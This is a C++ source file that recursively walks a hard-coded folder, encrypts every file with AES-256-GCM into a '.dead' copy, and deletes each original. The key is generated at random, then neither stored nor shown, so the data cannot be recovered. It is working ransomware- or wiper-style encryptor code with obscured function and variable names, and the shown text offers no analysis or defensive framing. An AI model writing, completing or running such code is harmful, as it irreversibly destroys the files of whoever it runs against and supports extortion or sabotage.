#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <openssl/evp.h>
#include <openssl/rand.h>

namespace fs = std::filesystem;

#define GCM_IV_SZ 12
#define CHK_SIZE 4096

typedef unsigned char byte;

void _low_level_proc(fs::path target, const std::vector<byte>& k) {
    fs::path out = target;
    out += ".dead";

    byte iv[GCM_IV_SZ];
    if (RAND_bytes(iv, GCM_IV_SZ) != 1) return;

    std::ifstream in_f(target, std::ios::binary);
    std::ofstream out_f(out, std::ios::binary);

    if (!in_f || !out_f) return;

    out_f.write((char*)iv, GCM_IV_SZ);

    EVP_CIPHER_CTX *z = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(z, EVP_aes_256_gcm(), 0, k.data(), iv);

    char b[CHK_SIZE];
    byte c[CHK_SIZE + 32];
    int r, w;

    while (in_f.read(b, CHK_SIZE) || (r = (int)in_f.gcount()) > 0) {
        r = (int)in_f.gcount(); 
        if (EVP_EncryptUpdate(z, c, &w, (byte*)b, r)) {
            out_f.write((char*)c, w);
        }
        if (in_f.eof()) break;
    }

    EVP_EncryptFinal_ex(z, c, &w);
    out_f.write((char*)c, w);

    byte t[16];
    EVP_CIPHER_CTX_ctrl(z, EVP_CTRL_GCM_GET_TAG, 16, t);
    out_f.write((char*)t, 16);

    EVP_CIPHER_CTX_free(z);
    in_f.close(); out_f.close();

    fs::remove(target);
    std::printf("-> %s\n", target.filename().string().c_str());
}

int main(int c, char** v) {
    const char* d = "Nombre de la carpeta ";
    
    std::vector<byte> s_k(32);
    RAND_bytes(s_k.data(), 32);

    if (!fs::exists(d) || !fs::is_directory(d)) {
        std::printf("No path\n");
        return 0;
    }

    try {
        for (auto const& entry : fs::recursive_directory_iterator(d)) {
            auto const& p = entry.path();
            if (fs::is_regular_file(p) && p.extension() != ".dead") {
                _low_level_proc(p, s_k);
            }
        }
        std::cout << "\nOK." << std::endl;
    } catch (...) {
       
    }

    return 0;
}
